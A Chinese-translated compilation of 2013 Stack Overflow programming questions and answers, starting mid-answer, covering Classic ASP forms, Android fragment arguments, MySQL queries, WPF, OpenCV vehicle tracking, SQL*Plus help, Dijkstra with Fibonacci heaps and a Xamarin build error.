> 赞同：0
> 
> 时间：2013-03-13T18:01:44.377

看起来您没有在 Foo 类中实现复制构造函数。在 Bar 构造函数中，每次迭代 Foo 的新实例都会在迭代结束时创建和销毁。所以在 Foo 中分配的内存被破坏了，但是将 Foo 的实例复制到 vector 的默认复制构造函数没有复制您使用“new”分配的内存，只是复制了指针。所以在每次迭代之后，每个向量元素都会被破坏。假设向量在开始时为您的对象分配了一些内存。然后，当缓冲区中没有位置并且他无法再增加该缓冲区时，vector 分配新内存并发生另一个复制操作。复制操作完成后，需要释放旧缓冲区，vector 销毁旧缓冲区中的所有对象，每个对象中的析构函数将对损坏的指针调用 delete[]。

# html - 如何在经典 ASP 中从 HTML 表中发布数据

> ID：15392256
> 
> 赞同：0
> 
> 时间：2013-03-13T17:24:43.757
> 
> 标签：html, asp-classic

我正在尝试将一些字段数据从我的 HTML 表中发布到一个新页面，但我似乎无法让我的隐藏输入值成为除 null 之外的任何值。表中的每一行都有一个详细信息按钮，我只想将该表中的主键发布到发布的页面。这是我尝试过的不起作用的方法：

```
<tr VALIGN="top">
    <td>
        <input type="submit" value="Details" /> 
        <input type= "hidden" name = "post" value=<%rs.Fields(1).Name%>/>
    </td>
<% For I = 0 to rs.fields.count - 1 %>
<td BORDERCOLOR="#c0c0c0"><font SIZE="1" FACE="Arial" COLOR="#000000"><%=(rs.Fields(I).Value) & "&nbsp;"%><br></font>
</td>
<%next%> 
```

我还尝试了其他一些变体，但我确信有一种简单的方法可以做到这一点，我想不通。如果您需要更多信息，请告诉我，谢谢

编辑：

`rs.Fields(1).Name`当我直接在发布的代码上方执行 Response.Write 时有一个值，所以我知道结果不为空。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T20:29:24.240

我认为您缺少 Response.Write 或缩写形式 <%= %> （您仍然需要将值输出到 HTML！）

```
<input type= "hidden" name = "post" value="<%= rs.Fields(1).Name %>" /> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-13T17:31:35.093

我不确定它是否会影响它，但请尝试在“=”周围没有空格：

```
<input type="hidden" name="post" value=<%rs.Fields(1).Name%> /> 
```

# java - Android：将数据（附加）传递给片段

> ID：15392261
> 
> 赞同：86
> 
> 时间：2013-03-13T17:24:54.913
> 
> 标签：java, android, android-intent, nullpointerexception

我是 Android 编程新手，在将 Parcelable 的 ArrayList 传递给片段时遇到问题。这是启动的 Activity（运行良好！），其中**feedlist**是一个 parcelable **Music**的 ArrayList 。

```
Intent in = new Intent(context, ListMusicsActivity.class);

in.putExtra("arrayMusic", feedList);
activity.startActivity(in); 
```

片段Activity onCreate() 方法：

```
@Override
protected void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activitymusiclist);

    if(savedInstanceState != null)
    {
        ListMusicFragment frag = new ListMusicFragment();
        frag.setArguments(getIntent().getExtras());
    }
} 
```

片段代码：

```
public class ListMusicFragment extends SherlockFragment{

private ArrayList<Music> listMusics = new ArrayList<Music>();
private ListView listMusic;

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, 
    Bundle savedInstanceState)
{
    listMusics = (ArrayList<Music>) getArguments().getSerializable("arrayMusic");
    View view = inflater.inflate(R.layout.musiclistview, container, false);
    listMusic = (ListView) view.findViewById(R.id.musicListView);
    listMusic.setAdapter(new MusicBaseAdapter(getActivity(), listMusics));

    return view;
}
} 
```

我认为问题出在一线

```
listMusics = (ArrayList<Music>) getArguments().getSerializable("arrayMusic"); 
```

最后这是我的音乐课：

```
public class Music implements Parcelable{

private String url;
private String artist;
private String title;
private String duration;
private String info_url;
private String lyrics;

public Music(String url, String artist, String title, 
    String duration, String lyrics, String info_url)
{
    this.url = url;
    this.artist = artist;
    this.title = title;
    this.duration = duration;
    this.lyrics = lyrics;
    this.info_url = info_url;
}

public Music(Parcel in)
{
    url = ParcelUtils.readString(in);
    artist = ParcelUtils.readString(in);
    title = ParcelUtils.readString(in);
    duration = ParcelUtils.readString(in);
    info_url = ParcelUtils.readString(in);
    lyrics = ParcelUtils.readString(in);
}

public String getUrl()
{
    return url;
}

public String getArtist()
{
    return artist;
}

public String getTitle()
{
    return title;
}

public String getDuration()
{
    return duration;
}

public String getLyrics()
{
    return lyrics;
}

public String getInfo()
{
    return info_url;
}

@Override
public int describeContents() {
    return 0;
}

@Override
public void writeToParcel(Parcel dest, int flags)
{
    ParcelUtils.writeString(dest, url);
    ParcelUtils.writeString(dest, artist);
    ParcelUtils.writeString(dest, title);
    ParcelUtils.writeString(dest, duration);
    ParcelUtils.writeString(dest, lyrics);
    ParcelUtils.writeString(dest, info_url);
}

public static final Parcelable.Creator<Music> CREATOR = 
    new Parcelable.Creator<Music>() {

    public Music createFromParcel(Parcel in)
    {
        return new Music(in);
    }

    public Music[] newArray(int size)
    {
        return new Music[size];
    }
};
} 
```

当我运行此代码时，我得到的问题是**Fragment onCreateView() 方法中的 java.lang.NullPointerException**。如果有人指出我正确的方向以查看我失败的地方，我将不胜感激。

**编辑**：问题已解决：我只需要将这一行添加到片段 Activity onCreate() 方法中（否则 getArguments() 将返回 null）：

```
getSupportFragmentManager().beginTransaction()
    .add(android.R.id.content, frag).commit(); 
```

并将其添加到片段代码中：

```
@Override
    public void onActivityCreated(Bundle savedInstanceState)
{
    super.onActivityCreated(savedInstanceState);

    Bundle bundle = getArguments();
    if(bundle != null)
    {
        listMusics = bundle.getParcelableArrayList("arrayMusic");
        listMusic.setAdapter(new MusicBaseAdapter(getActivity(), listMusics));
    }
} 
```

其中，listMusics 是`ArrayList`Music的一个`Parcelable`。

* * *

## 回答 #1

> 赞同：200
> 
> 时间：2013-03-13T17:42:27.327

两件事情。首先，我认为您没有正确添加要传递给片段的数据。您需要传递给片段的是捆绑包，而不是意图。例如，如果我想向`int`片段发送值，我会创建一个包，将其`int`放入该包中，然后将该包设置为创建片段时使用的参数。

```
Bundle bundle = new Bundle();
bundle.putInt(key, value);
fragment.setArguments(bundle); 
```

其次要检索该信息，您需要将参数发送到片段。然后，您根据您识别它的键提取值。例如在您的片段中：

```
Bundle bundle = this.getArguments();
if (bundle != null) {
    int i = bundle.getInt(key, defaulValue);
} 
```

你得到的变化取决于你放的东西。此外，默认值通常是`null`但不需要是。这取决于您是否为该参数设置了默认值。

最后，我认为您无法在`onCreateView`. 我认为您必须在片段的`onActivityCreated`方法中检索这些数据。我的推理如下。`onActivityCreated`在底层活动完成自己的`onCreate`方法后运行。如果您在 Activity 的`onCreate`方法期间将要检索的信息放在捆绑包中，则在您的片段的`onCreateView`. 尝试使用它，稍后再`onActivityCreated`更新您的`ListView`内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-10-15T10:41:19.163

我更喜欢`Serializable`= 没有样板代码。对于将数据传递给其他片段或活动[，与 a 的速度差异`Parcelable`](http://www.developerphil.com/parcelable-vs-serializable/)无关紧要。

我也总是为`Fragment`or提供一个辅助方法`Activity`，这样你总是知道必须传递哪些数据。这是您的示例`ListMusicFragment`：

```
private static final String EXTRA_MUSIC_LIST = "music_list";

public static ListMusicFragment createInstance(List<Music> music) {
    ListMusicFragment fragment = new ListMusicFragment();
    Bundle bundle = new Bundle();
    bundle.putSerializable(EXTRA_MUSIC_LIST, music);
    fragment.setArguments(bundle);
    return fragment;
}

@Override
public View onCreateView(...) { 
    ...
    Bundle bundle = intent.getArguments();
    List<Music> musicList = (List<Music>)bundle.getSerializable(EXTRA_MUSIC_LIST);
    ...
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-10-15T10:47:49.527

由于内存中没有重复的数据，我更喜欢捆绑包有一个简单的原因。它由片段的 init 公共方法组成

```
private ArrayList<Music> listMusics = new ArrayList<Music>();
private ListView listMusic;

public static ListMusicFragment createInstance(List<Music> music) {
    ListMusicFragment fragment = new ListMusicFragment();
    fragment.init(music);
    return fragment;
}

public void init(List<Music> music){
    this.listMusic = music;
}

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, 
    Bundle savedInstanceState)
{

    View view = inflater.inflate(R.layout.musiclistview, container, false);
    listMusic = (ListView) view.findViewById(R.id.musicListView);
    listMusic.setAdapter(new MusicBaseAdapter(getActivity(), listMusics));

    return view;
}
} 
```

简而言之，您通过 init 方法创建片段的实例（您可以根据需要调用它）您传递列表的引用，而无需通过序列化创建片段实例的副本。这非常有用，因为如果您更改列表中的某些内容，您将在应用程序的其他部分获得它，当然，您使用的内存更少。

# mysql - 使用 NOT EXISTS 清空表

> ID：15392266
> 
> 赞同：0
> 
> 时间：2013-03-13T17:25:03.990
> 
> 标签：mysql

我有一个查询：

```
SELECT g.name, s.hour, gs.weekday
FROM schedule s
INNER JOIN group_schedule gs ON gs.schedule_id = s.id
INNER JOIN groups g ON g.id = gs.group_id
WHERE EXISTS (
  SELECT *
  FROM group_schedule
  WHERE group_id =6
)
ORDER BY g.name, gs.weekday 
```

返回：

```
name    hour        weekday
A1-A2   10:00:00    1
A1-A2   17:00:00    1
A1-A2   10:30:00    1
A1-A2   17:30:00    1
A1-A2   18:00:00    2
A1-A2   11:30:00    2
A1-A2   18:30:00    2
A1-A2   11:00:00    2
A1-A2   12:30:00    3 
```

但我也需要获取没有这些组合的行，例如：

```
name   hour      weekday
A1-A2  10:30:00  1
A1-A2  11:00:00  1
A1-A2  11:30:00  1
... 
```

如果我使用 NOT EXISTS，我会得到一个空表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:35:15.307

我不知道，但你的意思是这样的：

```
SELECT g.name, s.hour, gs.weekday
FROM schedule s
INNER JOIN group_schedule gs 
ON gs.schedule_id = s.id AND group_id = 6 
INNER JOIN groups g ON g.id = gs.group_id
ORDER BY g.name, gs.weekday 
```

将 group_id 条件从通用 WHERE 子句中移出到 group_schedule JOIN 中？你知道在 ON 关键字后面可以有一个任意的逻辑表达式。

# c# - Scatterview Items 集合不删除项目

> ID：15392270
> 
> 赞同：0
> 
> 时间：2013-03-13T17:25:11.200
> 
> 标签：c#, wpf, pixelsense

谁能告诉我为什么在下面的代码中没有从集合中删除该项目？它穿过它而不扔，但 sv.Count 始终保持不变，并且该项目永远不会被删除。

```
public static void FadeOutAndRemove(ScatterView sv, ScatterViewItem svi)
    {
        try
        {
            svi.Opacity = 1.0;

            var a = new DoubleAnimation
            {
                From = 1.0,
                To = 0.0,
                FillBehavior = FillBehavior.Stop,
                BeginTime = TimeSpan.FromSeconds(0),
                Duration = new Duration(TimeSpan.FromSeconds(0.5))
            };

            var storyboard = new Storyboard();
            storyboard.Children.Add(a);

            Storyboard.SetTarget(a, svi);
            Storyboard.SetTargetProperty(a, new PropertyPath(UIElement.OpacityProperty));

            storyboard.Completed += delegate { 
                    svi.Visibility = Visibility.Hidden;
                    sv.Items.Remove(svi);
                    svi.Content = null;
                    svi = null;
            };

            storyboard.Begin();
        }
        catch (Exception ex)
        {
            //Handle error
        }
    } 
```

# opencv - 车辆分割和跟踪

> ID：15392272
> 
> 赞同：4
> 
> 时间：2013-03-13T17:25:14.140
> 
> 标签：opencv, tracking, classification, image-segmentation, object-detection

我一直在从事一个项目，在从无人机捕获的视频中检测和跟踪（移动）车辆，目前我正在使用一个支持向量机，该 SVM 训练了从车辆和背景图像中提取的局部特征的特征袋表示。然后，我使用滑动窗口检测方法来尝试定位图像中的车辆，然后我想对其进行跟踪。问题是这种方法速度很慢，而且我的检测器不像我想要的那样可靠，所以我得到了很多误报。

所以我一直在考虑尝试从背景中分割汽车以找到大致位置，以便在应用我的分类器之前减少搜索空间，但我不知道该怎么做，希望有人能帮忙？

另外，我一直在阅读有关使用层的运动分割，使用光流按流模型分割帧的内容，是否有人对这种方法有任何经验，如果有的话，您能否提供一些输入，以说明您是否认为这种方法适用于我的问题。

下面是来自示例视频的两帧

第 0 帧： [![在此处输入图像描述](../Images/acf7001f2cc3d6b3b413dd9f971a7455.png)](https://i.stack.imgur.com/CM8qA.jpg)

帧 5： [![在此处输入图像描述](../Images/9a0661849d68586eeeb9813574f0dc13.png)](https://i.stack.imgur.com/XVVZL.jpg)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-13T18:02:47.993

假设您的汽车正在移动，您可以尝试估计地平面（道路）。

您可以通过提取特征（SURF 而不是 SIFT，用于速度）、在帧对上匹配它们并使用 RANSAC 求解单应性来获得下降地平面估计，因为 3d 中的平面根据两个相机帧之间的单应性移动。

有了地平面后，您可以通过查看根据估计的单应性不移动的像素簇来识别汽车。

一种更复杂的方法是在地形上从运动中构建结构。这只是假设它是刚性的，而不是它是平面的。

* * *

**更新**

> 我想知道您是否可以扩展如何根据估计的单应性寻找不移动的像素簇？

当然。说`I`和`K`是两个视频帧，`H`是 中的单应性映射特征`I`到特征`K`。首先，您根据`I`变形，即您将变形图像计算为（大致 Matlab 表示法）。然后您查看平方或绝对差值图像。根据单应性移动的图像内容应该给出小的差异（假设图像之间的照明和曝光恒定）。违规的图片内容（例如移动的汽车）应突出显示。`K``H``Iw``Iw( [x y]' )=I( inv(H)[x y]' )``Diff=(Iw-K)*(Iw-K)``H``H`

对于聚类中的高错误像素组，`Diff`我将从简单的阈值处理开始（“`Diff`大于 X 的每个像素差异都是相关的”，可能使用自适应阈值）。阈值图像可以通过形态学操作（膨胀、腐蚀）进行清理，并与连接的组件进行聚类。这可能过于简单，但第一次尝试很容易实现，而且应该很快。如需更花哨的内容，请查看[Wikipedia 中的 Clustering](http://en.wikipedia.org/wiki/Cluster_analysis)。二维[高斯混合模型](http://en.wikipedia.org/wiki/Gaussian_mixture_model)可能很有趣；当您使用前一帧的检测结果对其进行初始化时，它应该非常快。

我对您提供的两个框架做了一个小实验，我不得不说我自己对它的效果感到有些惊讶。:-)**左图：**您发布的两帧之间的差异（颜色编码）。**右图：**将它们与单应性匹配后的帧之间的差异。其余的差异显然是移动的汽车，它们对于简单的阈值处理来说足够强大。

![图像对齐前后的帧差](../Images/acdeabd371fdea80f2e7a69164913b11.png)

考虑到您目前使用的方法，将它与我的建议结合起来可能会很有趣：

*   您可以尝试在差异图像`D`而不是原始图像中学习和分类汽车。这相当于学习汽车运动模式的样子，而不是汽车的样子，这可能更可靠。
*   您可以摆脱昂贵的窗口搜索并仅在`D`具有足够高值的区域上运行分类器。

一些补充说明：

*   从理论上讲，如果汽车不移动，它们甚至应该脱颖而出，因为它们不是平坦的，但考虑到您与场景的距离和相机分辨率，这种效果可能过于微妙。
*   如果你愿意，你可以用**Optical Flow**替换我提案中的特征提取/匹配部分。这相当于识别从地面的一致帧到帧运动中“突出”的流向量。然而，它可能容易在光流中出现异常值。您还可以尝试从流向量中获取单应性。
*   **这很重要：**无论您使用哪种方法，一旦您在一帧中找到汽车，您应该使用此信息来加强您在连续帧中对这些汽车的搜索，从而为接近旧的检测提供更高的可能性（卡尔曼滤波器， ETC）。这就是跟踪的全部意义所在！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-14T01:49:50.610

1.  如果您视野中的汽车数量始终保持不变但四处移动，那么您可以使用光流...它会在静止背景下为您提供良好的结果...如果汽车数量在变化，那么您需要在一定数量的帧后调用 OpenCV 中的 goodFeaturestoTrack 函数，并再次使用光流跟踪汽车。
2.  您可以使用背景建模来建模背景，因此汽车始终是您的前景。最简单的示例是帧区分...减去前一帧当前帧。`diff(x,y,k) = I(x,y,k) - I(x,y,k-1)`.当您的汽车在每一帧中移动时，您将获得它们的位置..
3.  这两个过程都可以正常工作，因为我认为你有一个静止的背景。[检查这个链接](http://www.youtube.com/watch?v=MOaKnCSejXQ)以找到光流可以做什么。

# java - 如何从 Web App 更改 OS Windows？

> ID：15392275
> 
> 赞同：0
> 
> 时间：2013-03-13T17:25:18.447
> 
> 标签：java

我正在用java编写一个网络应用程序。我很想知道是否有一种方法可以在浏览器窗口（运行 Web 应用程序）和本地 Java 客户端应用程序窗口（标准 Java 窗口）之间切换。Java 窗口是 Oracle Forms。

例如，当我在 Internet 浏览器中运行 Web 应用程序并单击一个按钮时。我希望按钮执行从 Internet 浏览器窗口切换到本地 java/forms 窗口的过程。因此，我需要在操作系统级别执行某些操作来切换我的窗口。

我怎么能这样做？我对任何可以使该用例起作用的想法感兴趣。例如，我可能需要在我的应用程序中引入和集成新技术？可能是Java Applet？

谢谢，

加文

# oracle10g - 无法获得 SQL*Plus 中 SQL 命令的帮助

> ID：15392283
> 
> 赞同：0
> 
> 时间：2013-03-13T17:25:40.827
> 
> 标签：oracle10g, sqlplus

我已经阅读了有关此主题的其他条目，但它们都不适合我。

我在 Linux 的 bash shell 中运行 SQL*Plus。SQL*Plus 版本是：

```
SQL*Plus: Release 10.2.0.1.0 - Production 
```

我已尝试按照此常见问题解答启用帮助工具： [http ://www.orafaq.com/wiki/SQL*Plus_FAQ#How_does_one_enable_the_SQL.2APlus_HELP_facility.3F](http://www.orafaq.com/wiki/SQL%2aPlus_FAQ#How_does_one_enable_the_SQL.2APlus_HELP_facility.3F)

但我在导入帮助脚本时出错：

```
DROP VIEW HELP_TEMP_VIEW
*
ERROR en línea 1:
ORA-00942: la tabla o vista no existe 
```

现在，如果我尝试获取 SELECT 命令的帮助，我会收到一条消息，告诉我该主题没有可用的帮助：

```
SQL> help select
SP2-0172: No se ha encontrado la ayuda que coincida con este tema. 
```

如果我执行“帮助索引”以显示内置帮助涵盖了哪些主题，似乎只涵盖了 SQL*Plus 命令，但没有 SQL 语句：

```
SQL> help index
Enter Help [topic] for help.

 @             COPY         PAUSE                    SHUTDOWN
 @@            DEFINE       PRINT                    SPOOL
 /             DEL          PROMPT                   SQLPLUS
 ACCEPT        DESCRIBE     QUIT                     START
 APPEND        DISCONNECT   RECOVER                  STARTUP
 ARCHIVE LOG   EDIT         REMARK                   STORE
 ATTRIBUTE     EXECUTE      REPFOOTER                TIMING
 BREAK         EXIT         REPHEADER                TTITLE
 BTITLE        GET          RESERVED WORDS (SQL)     UNDEFINE
 CHANGE        HELP         RESERVED WORDS (PL/SQL)  VARIABLE
 CLEAR         HOST         RUN                      WHENEVER OSERROR
 COLUMN        INPUT        SAVE                     WHENEVER SQLERROR
 COMPUTE       LIST         SET                      XQUERY
 CONNECT       PASSWORD     SHOW 
```

获得 SQL 命令的帮助会很棒，就像在 mysql 客户端中一样。任何帮助都非常受欢迎。提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T08:30:47.237

我已经查看了脚本，ORA-00942 通常是预期的，不会破坏任何东西。

这按设计工作。Oracle 只是没有为 SELECT、UPDATE、CREATE 等提供帮助，大概是因为它们将是大页面。您所看到的内部 sqlplus 命令是您所`HELP INDEX`期望的。

帮助内容在文件`helpus.sql`中的开放文本中。我试图用谷歌搜索任何旧版本的类似内容，但无济于事。如果您真的希望有一些自定义的 HELP 内容，我认为您可以自己按照 helpus.sql 的行编写自己的脚本并根据需要添加主题。

```
SQL> alter session set current_schema=system ;
SQL> INSERT INTO HELP VALUES ('TEST123', 1, 'Just testing...' ) ;
SQL> commit;
SQL> help test123
Just testing... 
```

# wpf - 将 ICommand 附加到 XAML 中的控件的方法

> ID：15392284
> 
> 赞同：0
> 
> 时间：2013-03-13T17:25:44.683
> 
> 标签：wpf, asp.net-mvc, xaml, icommand, command-pattern

我对 XAML 很陌生。为了在利用 XAML 的同时利用 MVC 体系结构和命令模式，我已经开始将静态 ICommand 绑定到按钮。我正在做一个有一百多个按钮的相当大的项目。我的问题是：是否有不同的方法将命令绑定到按钮以避免静态对象。关于 C#、WPF 和 XAML，静态是常用的吗？我确定有人已经使用 MVC、命令模式和 XAML 参与过一个项目，你的方法是什么？

我应该早点编辑这个，但是在处理这个项目时，当我问这个问题时，我意识到我对 c#、WPF 和 XAML 有多少了解。显然，在 WPF 中，实例属性使其可以方便地将方法和数据成员绑定到控件。

就 MVC / MVVM 而言，我想在我知道它是什么之前，我很犹豫将我的模型暴露给 VM。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T19:05:23.960

我认为您的意思是适用于 WPF 的 MVVM 模式。即模型视图ViewModel

1.  Model = 用于为被操作的数据构建表单模型
2.  View = Presentation（通常是一个主窗体和许多用户控件窗体）
3.  ViewModel = 演示者的代码容器（包含代码的类）

通常，您的绑定取代了从基础实现 RelayCommand 的 ICommand 方法。在实现 MVVM 模型之前有很多东西需要学习，我建议阅读 Josh Smith 的文章并下载他的示例以开始学习它：

有一些特殊的规则和原则需要学习，这个例子会经历很多。

[http://msdn.microsoft.com/en-us/magazine/dd419663.aspx](http://msdn.microsoft.com/en-us/magazine/dd419663.aspx)

我还认为了解 WPF 如何执行绑定是明智的。您可以使用绑定进行许多特殊设置，以帮助在不同的事件和其他地方执行操作。我什至不知道所有的绑定，但我知道你学得越多，你最终在 XAML 编码中节省的时间就越多，因为你可以重用、事件触发、继承和做很多事情来使你的应用程序更多比静态创作更强大。

[http://msdn.microsoft.com/en-us/library/ms752347.aspx](http://msdn.microsoft.com/en-us/library/ms752347.aspx)

# java - Java：使用斐波那契堆实现 Dijkstra 算法

> ID：15392289
> 
> 赞同：2
> 
> 时间：2013-03-13T17:26:17.437
> 
> 标签：java, data-structures, dijkstra, fibonacci-heap

新来的，但作为客人潜伏了很长一段时间:)

好的，所以我一直在尝试使用斐波那契堆（在 Java 中）做 Dijkstra 的最短路径算法。经过一番搜索，我偶然发现了两个代表斐波那契堆的现成实现。第一个实现做得相当漂亮，可以在[这里](http://keithschwarz.com/interesting/code/?dir=fibonacci-heap)找到。第二个实现，看起来不那么优雅，在[这里](https://sites.google.com/site/indy256/algo/fibonacci_heap)。

现在，这一切看起来都很好。但是，我想为我的 Dijkstra 算法版本使用其中一种实现，但我还没有运气。Dijkstra在使用中的实现如下：

```
public void dijkstra(Vertex source) {
    {
        source.minDistance = 0.;
        PriorityQueue<Vertex> vertexQueue = new PriorityQueue<>();
        vertexQueue.add(source);

        while (!vertexQueue.isEmpty()) {
            Vertex u = vertexQueue.poll();

            // Visit each edge exiting u
            for (Edge e : u.adjacencies) {
                Vertex v = e.target;
                double weight = e.weight;
                double distanceThroughU = u.minDistance + weight;
                if (distanceThroughU < v.minDistance) {
                    vertexQueue.remove(v);
                    v.minDistance = distanceThroughU;
                    v.previous = u;
                    vertexQueue.add(v);
                }
            }
        }
    }
} 
```

很明显，此实现使用基于 Java 的 PriorityQueue 类（我相信它基于二进制堆本身）。**我希望修改上面的代码，使其使用上述斐波那契堆实现中的任何一个，而不是 Java 的 PriorityQueue。**

我已经尝试了很多，但我就是不知道该怎么做，尽管我确信它就像替换几行代码一样简单。

我希望我足够清楚。这实际上是我在这些板上的第一篇文章。

任何帮助将不胜感激。

***编辑：***为了回应评论，我想我会用我的尝试场景之一来扩展我的帖子。

这是使用前面链接的第二个斐波那契堆实现的上述 Dijkstra 方法的修改版本：

```
public static void computePathsFibonacciHeap(Node source) {
    {
        source.minDistance = 0.;
        FibonacciHeap myHeap = new FibonacciHeap();
        myHeap.insert(source, source.minDistance);

        while (!myHeap.isEmpty()) {
            Node u = myHeap.min();

            // Visit each edge exiting u
            for (Edge e : u.adjacencies) {
                Node v = e.target;
                double weight = e.weight;
                double distanceThroughU = u.minDistance + weight;
                if (distanceThroughU < v.minDistance) {
                    v.minDistance = distanceThroughU;
                    myHeap.decreaseKey(v, v.minDistance);
                    v.previous = u;
                }
            }
        }
    }
} 
```

这几乎是直接从伪代码转换而来的（因此完全有可能我只是没有正确翻译它）。我得到的错误是“decreaseKey() 的值更大”。如果我尝试删除最小值，我会得到 NullPointerException。

我确定我做错了什么，我很想知道它是什么。再次，这是使用第二个 FHeap 实现。我宁愿使用第一个实现来做到这一点（它看起来更彻底/更专业），但不幸的是我不知道如何去做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-15T18:25:16.387

似乎您缺少使用 Double.POSITIVE_INFINITY 将所有节点添加到堆中（距离为 0.0 的源节点除外）。这就是为什么你有 NullPointerExceptions，它们根本不在堆中。

我对几个开源斐波那契堆实现做了一些测试。您可以在此处找到测试本身：[Experimenting-with-dijkstras-algorithm](https://gabormakrai.wordpress.com/2015/02/11/experimenting-with-dijkstras-algorithm/)。这也是我的 Dijsktra 算法的优先队列版本：[PriorityQueueDijkstra.java](https://github.com/gabormakrai/dijkstra-performance/blob/master/DijkstraPerformance/src/dijkstra/priority/PriorityQueueDijkstra.java)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:35:28.487

JDK 不提供斐波那契堆的实现。您必须创建自己的实现，或者您可以在这篇文章中找到一个：[Fibonacci Heap](https://stackoverflow.com/questions/6273833/does-sun-provides-a-java-implementation-of-a-fibonacci-heap)

之后你所要做的就是更换

```
PriorityQueue<Vertex> vertexQueue = new PriorityQueue<>(); 
```

经过

```
 FibonacciHeap<Vertex> vertexQueue = new FibonacciHeap<>(); 
```

然后只需在您提供的实现中使用等效的方法更改对`poll`,`add`和方法的调用。`remove`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-07T10:58:40.180

我自己使用过这个算法。*reduceKey*函数上方有一条注释，解释了该行为。

> 将指定元素的键降低到新的优先级。如果新优先级大于旧优先级，则此函数将引发 IllegalArgumentException。新的优先级必须是有限双精度，因此您不能将优先级设置为 NaN 或 +/- 无穷大。这样做也会引发 IllegalArgumentException。假设条目属于这个堆。出于效率原因，在运行时不检查此项。

至于实现，我想你会想使用**myHeap.dequeueMin().getValue()**而不是**myHeap.min()**。不同之处在于，*dequeueMin()*的工作方式与*poll()*类似，并在找到它后将其从堆中删除。

而不是**myHeap.decreaseKey(v, v.minDistance)**，只需添加它，例如**myHeap.insert(v, v.minDistance)**。

# xamarin.android - Xamarin.Android 使用带有 MultiImageChooser 的 java 绑定库

> ID：15392292
> 
> 赞同：1
> 
> 时间：2013-03-13T17:26:29.387
> 
> 标签：xamarin.android, java-binding

我尝试使用 Java 绑定库来使用 MultiImageChooser ( [https://github.com/derosa/MultiImageChooser](https://github.com/derosa/MultiImageChooser) )。

这些是我采取的步骤：

1.  在eclipse中加载了MultiImageChooser项目并导出了一个gallery.jar。
2.  在我的解决方案中，在 Visual Studio 中创建了一个 Java 绑定库项目。
3.  将gallery.jar 添加到“Jars”并将其类型更改为“EmbeddedJar”。
4.  添加了参考 jar（universal-image-loader-1.8.0.jar 和 android-support-v4.jar）并将它们的类型更改为“EmbeddedReferenceJar”。
5.  向 Metadata.xml 添加了一个转换以传递编译（协变返回类型）：

    > attr
    > path="/api/package[@name='com.luminous.pick']/class[@name='GalleryAdapter']/method[@name='getItem']" name="managedReturn"> Java.Lang .对象
    > / attr

6.  它通过了编译，但 BuildApk 任务因 System.ArgumentException 失败：已添加具有相同密钥的项目。

> （_BuildApkFastDev 目标）-> C:\Program Files (x86)\MSBuild\Xamarin\Android\Xamarin.Android.Common.targets(1132,3)：错误 MSB4018：“BuildApk”任务意外失败。[C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj] C:\Program Files (x86)\MSBuild\Xamarin\Android\Xamarin.Android.Common.targets(1132,3): 错误 MSB4018: System.ArgumentException: An已添加具有相同密钥的项目。[C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj] C:\Program Files (x86)\MSBuild\Xamarin\Android\Xamarin.Android.Common.targets(1132,3)：错误 MSB4018：在 System.ThrowHelper。 ThrowArgumentException（ExceptionResource 资源）[C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj] C:\Program Files (x86)\MSBuild\Xamarin\Android\Xamarin.Android.Common.targets(1132,3)：错误 MSB4018：在系统。*InternalAddEntry(ZipEntry ze) [C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj] C:\Program Files (x86)\MSBuild\Xamarin\Android\Xamarin.Android.Common.targets(1132,3)：错误 MSB4018：在 Ionic.Zip.ZipFile.AddEntry(String entryName, Stream stream) [C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj] C:\Program Files (x86)\MSBuild\Xamarin\Android\Xamarin.Android.Common。目标(1132,3): 错误 MSB4018: 在 Ionic.Zip.ZipFile.AddEntry(String entryName, Byte[] byteContent) [C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj] C:\Program Files (x86)\ MSBuild\Xamarin\Android\Xamarin.Android.Common.targets(1132,3): 错误 MSB4018: 在 Xamarin.Android.Tasks.BuildApk.Execute() [C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj] C: \Program Files (x86)\MSBuild\Xamarin\Android\Xamarin.Android.Common.targets(1132,3)：错误 MSB4018：在 Microsoft.Build.BackEnd.TaskExecutionHost.Microsoft.Build.BackEnd.ITaskExecutionHost.Execute() [C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj] C:\Program Files (x86)\MSBuild\Xamarin\ Android\Xamarin.Android.Common.targets(1132,3)：错误 MSB4018：在 Microsoft.Build.BackEnd.TaskBuilder.d*_20.MoveNext() [C:\awork\TestClientNG\TestAndroidApp\TestAndroidApp.csproj]

知道如何调试或继续此操作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T05:14:24.987

幸好你列出了你执行的确切步骤，我被同样的问题困住了，整晚都在打破我的头。问题与您在eclipse中构建的jar有关。导出到 jar 时，请确保取消选中所有其他项目文件，例如 .classpath、.project、pom.xml、project.properties，尤其是 AndroidManifest.xml。由于这些进入了 jar，最终有两个 android 清单文件导致您看到的错误。

# jquery - 添加/删除类和更改显示的 jQuery 代码不起作用？

> ID：15392297
> 
> 赞同：0
> 
> 时间：2013-03-13T17:26:55.507
> 
> 标签：jquery, reverse-engineering

